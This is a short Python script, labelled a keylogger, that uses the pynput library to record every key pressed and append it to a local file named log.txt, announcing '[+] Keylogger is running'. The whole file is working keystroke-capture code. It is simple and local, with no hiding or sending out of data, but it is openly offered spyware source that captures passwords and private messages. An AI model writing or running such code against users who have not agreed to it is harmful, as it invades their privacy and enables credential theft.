from pynput.keyboard import Listener

# Function to log keystrokes
def log_keystroke(key):

    
   # Clean up key format
    key = str(key).replace("'", "")
    with open("log.txt", "a") as log_file:
        log_file.write(key + "\n")



# Function to start listening to keystrokes
def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()



if __name__ == "__main__":
    print("[+] Keylogger is running... (press CTRL + c to stop)")
    start_logging()